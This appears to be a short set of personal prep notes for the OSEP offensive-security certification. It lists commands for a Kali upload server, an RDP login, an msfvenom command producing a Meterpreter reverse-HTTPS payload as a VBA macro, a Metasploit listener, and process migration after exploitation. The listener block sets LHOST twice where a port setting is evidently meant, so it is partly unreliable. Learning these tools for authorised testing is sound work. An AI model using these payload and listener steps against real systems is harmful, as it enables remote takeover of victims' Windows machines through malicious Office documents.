# OSEP-Prep-Notes
OSEP Prep Notes



# Kali File Transfer Server

python -m uploadserver 8000

# RDP with xFreeRDP

xfreerdp /u:USERNAME /p:PASSWORD /w:1366 /h:768 /v:SERVER_IP

# VBA Application Script

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.xx.xx LPORT=443 EXITFUNC=thread -f vbapplication

# Listen With Meterpreter

```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST OUR_KALI_IP
set LHOST 443
set EXITFUNC thread
run
```

# Post Exploitation - Migrate To Another Process

```
ps
> find a suitable process (like notepad.exe etc.)

migrate PID_OF_PROCESS
> the migration is success.

run post/windows/manage/migrate
> You should try this too.
```

